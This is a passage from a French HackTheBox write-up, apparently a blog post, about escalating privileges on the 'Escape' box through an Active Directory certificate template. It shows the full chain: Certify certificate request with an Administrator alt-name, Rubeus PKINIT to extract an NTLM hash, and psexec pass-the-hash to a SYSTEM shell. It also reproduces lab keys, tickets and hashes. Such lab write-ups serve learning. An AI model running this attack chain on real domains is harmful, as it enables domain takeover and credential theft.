+<p>Finalement pour que la privesc fonctionne, il faut que notre utilisateur ait les droits de demander un certificat, qu&rsquo;il puisse spécifier un <code>EKU</code> lui permettant de s&rsquo;authentifier avec son certificat, et il faut que l&rsquo;option subjectAltName soit disponible. Par chance ces trois contraintes étaient remplies sur cette box.</p>
+<h4 id="exploitation">Exploitation</h4>
+<p>Pour pouvoir demander un certificat à la CA de l&rsquo;AD, il faut importer le binaire <code>certify.exe</code> sur la machine ce que nous pouvons faire avec evil-winrm comme ceci:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\Ryan.Cooper&gt; upload Certify.exe
+</span></span><span class="line"><span class="cl">Info: Uploading Certify.exe to C:\Users\Ryan.Cooper\Certify.exe
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                                                             
+</span></span><span class="line"><span class="cl">Data: 232104 bytes of 232104 bytes copied
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Info: Upload successful!
+</span></span></code></pre></div><p>Maintenant on peut demander un certificat en spécifiant le template <code>UserAuthentication</code> qui spécifie que l&rsquo;on pourra utiliser ce certificat pour s&rsquo;identifier et avec l&rsquo;option <code>/altname</code> qui spécifie le second utilisateur à associer à notre certificat, pour une privesc on met donc l&rsquo;administrateur local du DC.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   _____          _   _  __
+</span></span><span class="line"><span class="cl">  / ____|        | | (_)/ _|
+</span></span><span class="line"><span class="cl"> | |     ___ _ __| |_ _| |_ _   _
+</span></span><span class="line"><span class="cl"> | |    / _ \ &#39;__| __| |  _| | | |
+</span></span><span class="line"><span class="cl"> | |___|  __/ |  | |_| | | | |_| |
+</span></span><span class="line"><span class="cl">  \_____\___|_|   \__|_|_|  \__, |
+</span></span><span class="line"><span class="cl">                             __/ |
+</span></span><span class="line"><span class="cl">                            |___./
+</span></span><span class="line"><span class="cl">  v1.0.0
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Action: Request a Certificates
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Current user context    : sequel\Ryan.Cooper
+</span></span><span class="line"><span class="cl">[*] No subject name specified, using current context as subject.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Template                : UserAuthentication
+</span></span><span class="line"><span class="cl">[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
+</span></span><span class="line"><span class="cl">[*] AltName                 : Administrator
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] CA Response             : The certificate had been issued.
+</span></span><span class="line"><span class="cl">[*] Request ID              : 10
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] cert.pem         :
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-----BEGIN RSA PRIVATE KEY-----
+</span></span><span class="line"><span class="cl">MIIEpAIBAAKCAQEA2JtqGlwdUZBoJPQKIjuIZbMfoLIPxw9hNUEoqXy0Cv07G0JZ
+</span></span><span class="line"><span class="cl">Etvuy6eLPwPLFKmZiRZlHEQlJLxqOLRkGAboFbpmTywqWWfAnqSCbjpn0BHlCR8e
+</span></span><span class="line"><span class="cl">0yL2MdsSIDdkcb0cz+SOk+iudsSxxT4ECSE39TBo2XUzMMJ8gBAq+/r1rlUPvE5S
+</span></span><span class="line"><span class="cl">23DPNbXfaVvPS6GC9SFqOrRwz2crMFxVQSvL2TU5y8sOVwHKy5CU7hUcbjJYl4YF
+</span></span><span class="line"><span class="cl">fXERiCodMi0WFL4PgQV6bmJcfoiUmn1l+FiMvu/FuIgY/m6Jhw8pNdwXzk9bfspM
+</span></span><span class="line"><span class="cl">3hG00Lm2m/fVA2S+/UpVVT+sgzEiITBMu7j2HQIDAQABAoIBAQDQf+kGLpzaIlLd
+</span></span><span class="line"><span class="cl">HzuR8BQ/MMjE+iFNz3QWuv3VB4CXA2KdvqPXD3Uw+7mBkrkszoRH/RKevsmyLttg
+</span></span><span class="line"><span class="cl">cePXbO6B28cXdr/dB43WJyyVxgqfslnxCc+2FPU+0E0GTcuV4B+Xzb2gil1FXdhw
+</span></span><span class="line"><span class="cl">sF1aHGuszEhg6fu4d7032FhH7S4H+3r9VrX/a481LI3dhoLbAqvEsnd+QuqKZwnJ
+</span></span><span class="line"><span class="cl">LsNtt65O6DMNoJa/TKWs5FHiPDQv6xFYkNtN9K3W2riTh4eJyAfydKBGbLLMe9CL
+</span></span><span class="line"><span class="cl">3N5tunVqS2Mu3SOPAPp82DcTJZ73EV5oLZRaccJqA/v+LnYqblNWiiq5CRl9OYoA
+</span></span><span class="line"><span class="cl">JwfVy8XRAoGBAPjc5kltXiuxehD3HxYr15OSylvxfH/wE1H/T9ckFrgm8Wtqcy8A
+</span></span><span class="line"><span class="cl">GxbXXllPLghy7Drjae5393zwgclkvlrkR7ddtkGRaSFHO15zS38SHCnt64cNBcqj
+</span></span><span class="line"><span class="cl">qGGv97aP9MipxZWLo1hSsNDPjGCSJ7ewKMKGxpu9gqObkXik8Wx1HeDLAoGBAN7R
+</span></span><span class="line"><span class="cl">swySBWYS/3VjI71zuE/OhPntfwC1s5HVWaRz0LTO0tZkQBMGDOjuEYvD/CuVNUMB
+</span></span><span class="line"><span class="cl">xcAu6oaaH2CmOyYOv96lJkXq9j1WcNqBt4RkHSy6MNAR6t1o1D0+RP7+zh/OdPDx
+</span></span><span class="line"><span class="cl">Zi2RicbBPpU40/n3rphvk8YL0QXT0v3nHXQqSC+3AoGAAYD0M0Vh6EmuPyP/IBcr
+</span></span><span class="line"><span class="cl">ukyMxHl1EyDUPQ6Z4Obq7DnwA4IlKAeMIlsyyr9bu9lV7BUrsrEu4aZiYmEldU8j
+</span></span><span class="line"><span class="cl">z8vVKhhC1lyj0zJHJoFpgidZ4PsHKe5LOiviB0xfYkcEVp79Ya8+OkTGyF6ZttZt
+</span></span><span class="line"><span class="cl">qJ8/2/kNLQfnnR8CBnG+uHkCgYEAmsGuyBZLJaAgSZm34weShet8NFIdmZKZy7oQ
+</span></span><span class="line"><span class="cl">7sV5uXrEuR8b2ZqkMMvY5+gRJvwU6Bs9C8QKI767+Fa8UiyAWtT9hiYxLFzzOPBL
+</span></span><span class="line"><span class="cl">U+ps0PnomTs4ktsSPg8XwLuc0j6EviwLua6RsLfbDa1QnRbH7xvf2PewD4oVyz9Q
+</span></span><span class="line"><span class="cl">F7SeOnUCgYBjJQuKadpSFCHSQbGpi+xQbAiJGYaas0NBLZ393m3LCh580LKa7QHr
+</span></span><span class="line"><span class="cl">R0tdvEEhrSGUFkS4UvZoBoXEqp3SF7dcBDaPNl1KwQyWcExxdHq+N6HGZeSEKssf
+</span></span><span class="line"><span class="cl">Qug2RmX9zQeP5MaHEU+jKrFC8lViHfkGcWRnBMaJraPCQaFWKDRyGg==
+</span></span><span class="line"><span class="cl">-----END RSA PRIVATE KEY-----
+</span></span><span class="line"><span class="cl">-----BEGIN CERTIFICATE-----
+</span></span><span class="line"><span class="cl">MIIGEjCCBPqgAwIBAgITHgAAAAoaz+dKUyVfWQAAAAAACjANBgkqhkiG9w0BAQsF
+</span></span><span class="line"><span class="cl">ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
+</span></span><span class="line"><span class="cl">MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjMwNjE2MDAyODUwWhcNMjUwNjE2
+</span></span><span class="line"><span class="cl">MDAzODUwWjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
+</span></span><span class="line"><span class="cl">c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
+</span></span><span class="line"><span class="cl">MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDYm2oaXB1RkGgk9AoiO4hlsx+g
+</span></span><span class="line"><span class="cl">sg/HD2E1QSipfLQK/TsbQlkS2+7Lp4s/A8sUqZmJFmUcRCUkvGo4tGQYBugVumZP
+</span></span><span class="line"><span class="cl">LCpZZ8CepIJuOmfQEeUJHx7TIvYx2xIgN2RxvRzP5I6T6K52xLHFPgQJITf1MGjZ
+</span></span><span class="line"><span class="cl">dTMwwnyAECr7+vWuVQ+8TlLbcM81td9pW89LoYL1IWo6tHDPZyswXFVBK8vZNTnL
+</span></span><span class="line"><span class="cl">yw5XAcrLkJTuFRxuMliXhgV9cRGIKh0yLRYUvg+BBXpuYlx+iJSafWX4WIy+78W4
+</span></span><span class="line"><span class="cl">iBj+bomHDyk13BfOT1t+ykzeEbTQubab99UDZL79SlVVP6yDMSIhMEy7uPYdAgMB
+</span></span><span class="line"><span class="cl">AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
+</span></span><span class="line"><span class="cl">lTWDv8NZg4nKNYF338oIhp7sKQIBZAIBBTApBgNVHSUEIjAgBggrBgEFBQcDAgYI
+</span></span><span class="line"><span class="cl">KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
+</span></span><span class="line"><span class="cl">CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
+</span></span><span class="line"><span class="cl">hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
+</span></span><span class="line"><span class="cl">Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAuMQpb7ZsEqSmYgEGOu7y5wj1Ms
+</span></span><span class="line"><span class="cl">MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1BZG1pbmlzdHJhdG9yMB8GA1Ud
+</span></span><span class="line"><span class="cl">IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
+</span></span><span class="line"><span class="cl">gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
+</span></span><span class="line"><span class="cl">bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
+</span></span><span class="line"><span class="cl">bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
+</span></span><span class="line"><span class="cl">ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
+</span></span><span class="line"><span class="cl">gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
+</span></span><span class="line"><span class="cl">QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
+</span></span><span class="line"><span class="cl">bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
+</span></span><span class="line"><span class="cl">b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
+</span></span><span class="line"><span class="cl">AAOCAQEAN2rOzjeX+iCItQ86bpsxsQm/qc87nobXuC8fO/u/ThRJ3i+aFdLbM0GH
+</span></span><span class="line"><span class="cl">0cSd75zve1oIRTmQOr194m/Riu0kVVco/vHSqN4oJezfgdWf4bwSh60QNTU/ATnp
+</span></span><span class="line"><span class="cl">ei3Zi7GYRPMRxC6CtXHbxohU+aplrXMMZ8noD094ix0jcyE2CG9AI3awle0Xa47U
+</span></span><span class="line"><span class="cl">Ix8b6Njph+m4Kx7UGVdk8ZMoaAx4D1VWnimnQ7qsGL7yi3eGkoH0i2yR5g+9Xd8s
+</span></span><span class="line"><span class="cl">kyPkC1OGGB2610j8CEKrzzkQGHPdhdoIU+kHFmq+zkZUN9MHVGTHI/6uwSs83OuK
+</span></span><span class="line"><span class="cl">EDoXyL/FliGefbiTsT6xpFzmJ1KVlQ==
+</span></span><span class="line"><span class="cl">-----END CERTIFICATE-----
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP &#34;Microsoft Enhanced Cryptographic Provider v1.0&#34; -export -out cert.pfx
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Certify completed in 00:00:12.9065614
+</span></span></code></pre></div><p>Comme suggéré par le programme, il nous faut maintenant convertir ce certificat du format <code>PEM</code> au format <code>PFX</code> pour pouvoir ensuite l&rsquo;utiliser pour s&rsquo;identifier auprès du TGS.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">openssl pkcs12 -in certif.pem -keyex -CSP &#34;Microsoft Enhanced Cryptographic Provider v1.0&#34; -export -out cert.pfx
+</span></span></code></pre></div><p>Maintenant on upload notre certificat fraichement créé ainsi que le binaire de Rubeus, on spécifie l&rsquo;option <code>/getcredentials</code> pour récupérer un <code>NTHash</code> de l&rsquo;administrateur:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   ______        _
+</span></span><span class="line"><span class="cl">  (_____ \      | |
+</span></span><span class="line"><span class="cl">   _____) )_   _| |__  _____ _   _  ___
+</span></span><span class="line"><span class="cl">  |  __  /| | | |  _ \| ___ | | | |/___)
+</span></span><span class="line"><span class="cl">  | |  \ \| |_| | |_) ) ____| |_| |___ |
+</span></span><span class="line"><span class="cl">  |_|   |_|____/|____/|_____)____/(___/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  v2.2.0
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Action: Ask TGT
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
+</span></span><span class="line"><span class="cl">[*] Building AS-REQ (w/ PKINIT preauth) for: &#39;sequel.htb\Administrator&#39;
+</span></span><span class="line"><span class="cl">[*] Using domain controller: fe80::59de:dd89:1ace:5e71%4:88
+</span></span><span class="line"><span class="cl">[+] TGT request successful!
+</span></span><span class="line"><span class="cl">[*] base64(ticket.kirbi):
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      doIGSDCCBkSgAwIBBaEDAgEWooIFXjCCBVphggVWMIIFUqADAgEFoQwbClNFUVVFTC5IVEKiHzAdoAMC
+</span></span><span class="line"><span class="cl">      AQKhFjAUGwZrcmJ0Z3QbCnNlcXVlbC5odGKjggUaMIIFFqADAgESoQMCAQKiggUIBIIFBHcmXzLP3LE6
+</span></span><span class="line"><span class="cl">      hn0ONcorr9bV+SMnbtF+handfptlfctMu7g2cmQkY1dnDO9U91rw2cJZbeQomV50b7zyUjBDrolD0bKV
+</span></span><span class="line"><span class="cl">      WcLDuMll/yfqmukYP0eKaAzLtfMPwhRu1rS5r6XB7ySTzcfURHyOVq45vZnQv/J9dkAfrnjhlTHdCV2M
+</span></span><span class="line"><span class="cl">      LWlr/aJn1cujqCgzBwspgdW3WToJZj51dMT5gb7mIvz8tI++a0LH+D+oUKbcMEvEU6c2+eeVyyGgdQGL
+</span></span><span class="line"><span class="cl">      C5DijtJsNAbmY80Rt0QtlPB72zRAp1j14Im5X2PERsYEkSbTcENdAo+2zi/uYqCk2Mi27HNWp3erOqw1
+</span></span><span class="line"><span class="cl">      Yx849qCR+YWrdJi3O9cD8iLjh9PVnIzTHmT5ipGqOBY+8KmWDOgJ5ovJL9Qz694DSA7/te1bLrwqnLt5
+</span></span><span class="line"><span class="cl">      9hH4NSnoLAj4gL9Y6jbCVWW3z7oecSSZtutDIj0TXA1AxabSSDzDqlle5XRgLw9pWRxofbBXgUthDX2G
+</span></span><span class="line"><span class="cl">      TAWNsqZA1Vl98hCtxTO3cOAZlSY/F7c7GqMT0XtB5xo4t6NPdtOoOlm2maarLC7cVe2tx+IIYmqSHP9u
+</span></span><span class="line"><span class="cl">      ZN6ZpxoH+pkx4pwNWU/FzyHg4jTW6cLK3MFYZeSF8nCg1nRfWe3u+1gCP/2SPsSrh1a5eiybf0WAoCLN
+</span></span><span class="line"><span class="cl">      m0j3+jPagLSPgdPJr4VMrFWIT8hOae3nVAf4Y0lKe7SCL+e+hBwChsaWqtLLx8h3Ogl4xjT1nl0+O5cQ
+</span></span><span class="line"><span class="cl">      e1laYBdslv5HwOZe5wDPkD+s5wp4FN/GNEZvwM4s19aLk27epRVKjk8Xj/aChiM9fOXmbwhSBtMgPhkS
+</span></span><span class="line"><span class="cl">      k5pi04+3yINhyw05jdf4kXgTlbmtgqm25S0maclDPeHDCVQ/svtVoCN6Wea+6HKlH5D/jLihFtk22d4v
+</span></span><span class="line"><span class="cl">      UtWSDuZRQ/0kvWgcp3XbArgCdnWwuHGZhBp1fq2evk+/S/k+Va4qRbXt+WiWyCN0UNxMs8JgB5GfhjxE
+</span></span><span class="line"><span class="cl">      sZ+xzx5otYmVb3v6atYcxYRqt+kzHzs3zRczLFO7J9Gl+4w4lVXvKdSooSfJhMb1cy0SKfI2kgRvwBeu
+</span></span><span class="line"><span class="cl">      CiZtlwToIPae1anKSvL/QSssWD67BVQGsVVHYxHIhmn9XrSsZ4shwwuzV4RUMFia7q4HedRY/0z5jT7O
+</span></span><span class="line"><span class="cl">      gLR4eKt8QCo9x5JMgbb9pU5topmNr+yQk0cF5OfzwFAr1j4X7mEmA01b7sNvWL0h7TNATOhFsQU8QLwg
+</span></span><span class="line"><span class="cl">      INUOeR87mWaSQ5+ajQy5vYmAcx3BncRjXxC6iKr1LdrkdK4F84qG1vizPTBmZoctzCJQxGDs9TZXIPx5
+</span></span><span class="line"><span class="cl">      Ee0UadhDIQ/X8q9DqVYItrNTl+EUBjKBiLXeraRaf999AbLzt9kWmQdYoXI85h0h7FDKfjMQYjFwBy8S
+</span></span><span class="line"><span class="cl">      29xeD1LBPV0P1cxvOxq0lvKaNeUMZmYw1KtDWLjA2pOtOA+Zv4aIiE68tLuQs/MLRJPufLlJuFK5yXF0
+</span></span><span class="line"><span class="cl">      q/Fn0ZLLYdv3fPPwtw8H6nbou3Qbq65f6twbscxRzx3ifAMs3uZ7xkgY1QKhlrbc+sIHIVfZIXLbcQgD
+</span></span><span class="line"><span class="cl">      Vc6Yds+kwxenuw12ZpxkkUySrPE8XoNepiih3fCDBt27ji3U3rjk0HdPgAq/p4yc9AmRYUn/0sgixT97
+</span></span><span class="line"><span class="cl">      wWBeopKUJy90EHpNgZWoH+mx5ln6ZSZCpd2r9Pz45we5mJrNAu39sYg2JiM73KAag+bMwHtUvCMPoWls
+</span></span><span class="line"><span class="cl">      v9CYedOaUB4k1NBWNwMyDqOB1TCB0qADAgEAooHKBIHHfYHEMIHBoIG+MIG7MIG4oBswGaADAgEXoRIE
+</span></span><span class="line"><span class="cl">      ELkSQ3sYvj5YxfgKPWgt9x+hDBsKU0VRVUVMLkhUQqIaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3Kj
+</span></span><span class="line"><span class="cl">      BwMFAADhAAClERgPMjAyMzA2MTcwNDA4NDFaphEYDzIwMjMwNjE3MTQwODQxWqcRGA8yMDIzMDYyNDA0
+</span></span><span class="line"><span class="cl">      MDg0MVqoDBsKU0VRVUVMLkhUQqkfMB2gAwIBAqEWMBQbBmtyYnRndBsKc2VxdWVsLmh0Yg==
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  ServiceName              :  krbtgt/sequel.htb
+</span></span><span class="line"><span class="cl">  ServiceRealm             :  SEQUEL.HTB
+</span></span><span class="line"><span class="cl">  UserName                 :  Administrator
+</span></span><span class="line"><span class="cl">  UserRealm                :  SEQUEL.HTB
+</span></span><span class="line"><span class="cl">  StartTime                :  6/16/2023 9:08:41 PM
+</span></span><span class="line"><span class="cl">  EndTime                  :  6/17/2023 7:08:41 AM
+</span></span><span class="line"><span class="cl">  RenewTill                :  6/23/2023 9:08:41 PM
+</span></span><span class="line"><span class="cl">  Flags                    :  name_canonicalize, pre_authent, initial, renewable
+</span></span><span class="line"><span class="cl">  KeyType                  :  rc4_hmac
+</span></span><span class="line"><span class="cl">  Base64(key)              :  uRJDexi+PljF+Ao9aC33Hw==
+</span></span><span class="line"><span class="cl">  ASREP (key)              :  AE715F3B89BFC48C00CCF0A427E72CD4
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Getting credentials using U2U
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  CredentialInfo         :
+</span></span><span class="line"><span class="cl">    Version              : 0
+</span></span><span class="line"><span class="cl">    EncryptionType       : rc4_hmac
+</span></span><span class="line"><span class="cl">    CredentialData       :
+</span></span><span class="line"><span class="cl">      CredentialCount    : 1
+</span></span><span class="line"><span class="cl">       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE
+</span></span></code></pre></div><p>Finalement il ne nous reste plus qu&rsquo;à Pass The Hash avec le hash que l&rsquo;on vient d&rsquo;obtenir et récupérer le flag root:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">python3 /usr/share/doc/python3-impacket/examples/psexec.py sequel.htb/Administrator@10.10.11.202 -hashes aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
+</span></span><span class="line"><span class="cl">Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Requesting shares on 10.10.11.202.....
+</span></span><span class="line"><span class="cl">[*] Found writable share ADMIN$
+</span></span><span class="line"><span class="cl">[*] Uploading file AwSRfBfO.exe
+</span></span><span class="line"><span class="cl">[*] Opening SVCManager on 10.10.11.202.....
+</span></span><span class="line"><span class="cl">[*] Creating service PNtf on 10.10.11.202.....
+</span></span><span class="line"><span class="cl">[*] Starting service PNtf.....
+</span></span><span class="line"><span class="cl">[!] Press help for extra shell commands
+</span></span><span class="line"><span class="cl">Microsoft Windows [Version 10.0.17763.2746]
+</span></span><span class="line"><span class="cl">(c) 2018 Microsoft Corporation. All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:\Windows\system32&gt; whoami
+</span></span><span class="line"><span class="cl">nt authority\system
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">C:\Users\Administrator\Desktop&gt; dir
+</span></span><span class="line"><span class="cl"> Volume in drive C has no label.
+</span></span><span class="line"><span class="cl"> Volume Serial Number is EB33-4140
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> Directory of C:\Users\Administrator\Desktop
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">02/06/2023  04:43 PM    &lt;DIR&gt;          .
+</span></span><span class="line"><span class="cl">02/06/2023  04:43 PM    &lt;DIR&gt;          ..
+</span></span><span class="line"><span class="cl">06/16/2023  05:47 AM                34 root.txt
+</span></span><span class="line"><span class="cl">               1 File(s)             34 bytes
+</span></span><span class="line"><span class="cl">               2 Dir(s)   5,943,947,264 bytes free
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:\Users\Administrator\Desktop&gt; type root.txt
+</span></span><span class="line"><span class="cl">e93fbe617988de512fcf81df9bdcd841
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:\Users\Administrator\Desktop&gt;
+</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
+<p>Cette box était une de mes premières box windows sur HackTheBox et je l&rsquo;ai trouvée très intéressante pour comprendre les méthodes d&rsquo;exploitations relatives aux requêtes de certificats sur un active directory 😀.</p>
+</div>
+  
+    <div class="mt-16">
+
+</div>
+  
+</article>
+      </div>
+    </main><footer class="fixed left-0 bottom-0 w-full bg-base px-page-gutter">
+  <div class="flex justify-center items-center h-footer-height">
+    <div
+      class="flex flex-row w-full max-w-content justify-between lowercase italic gap-3"
+    >
+      <nav>
+        <a href="http://localhost:1313//index.xml"
+          ><svg
+            width="18px"
+            height="18px"
+            xmlns="http://www.w3.org/2000/svg"
+            fill="none"
+            viewBox="0 0 24 24"
+            stroke-width="1.5"
+            stroke="currentColor"
+          >
+            <path
+              stroke-linecap="round"
+              stroke-linejoin="round"
+              d="M12.75 19.5v-.75a7.5 7.5 0 00-7.5-7.5H4.5m0-6.75h.75c7.87 0 14.25 6.38 14.25 14.25v.75M6 18.75a.75.75 0 11-1.5 0 .75.75 0 011.5 0z"
+            />
+          </svg>
+        </a>
+      </nav>
+      <span class="text-muted hidden md:block">
+        &copy;
+        2025
+        <a
+          href="https://github.com/ntk148v/hugo-toigian"
+          class="font-bold hover:underline"
+          >hugo-toigian</a
+        >
+      </span>
+      <div id="header-theme-button">
+        <svg
+          id="dark_mode_btn"
+          class="hidden toolbox-btn"
+          width="18px"
+          height="18px"
+          xmlns="http://www.w3.org/2000/svg"
+          fill="none"
+          viewBox="0 0 24 24"
+          stroke-width="1.5"
+          stroke="currentColor"
+        >
+          <path
+            stroke-linecap="round"
+            stroke-linejoin="round"
+            d="M21.752 15.002A9.718 9.718 0 0118 15.75c-5.385 0-9.75-4.365-9.75-9.75 0-1.33.266-2.597.748-3.752A9.753 9.753 0 003 11.25C3 16.635 7.365 21 12.75 21a9.753 9.753 0 009.002-5.998z"
+          />
+        </svg>
+        <svg
+          id="light_mode_btn"
+          class="hidden toolbox-btn"
+          width="18px"
+          height="18px"
+          xmlns="http://www.w3.org/2000/svg"
+          fill="none"
+          viewBox="0 0 24 24"
+          stroke-width="1.5"
+          stroke="currentColor"
+        >
+          <path
+            stroke-linecap="round"
+            stroke-linejoin="round"
+            d="M12 3v2.25m6.364.386l-1.591 1.591M21 12h-2.25m-.386 6.364l-1.591-1.591M12 18.75V21m-4.773-4.227l-1.591 1.591M5.25 12H3m4.227-4.773L5.636 5.636M15.75 12a3.75 3.75 0 11-7.5 0 3.75 3.75 0 017.5 0z"
+          />
+        </svg>
+      </div>
+    </div>
+  </div>
+</footer>
+</body>
+</html>
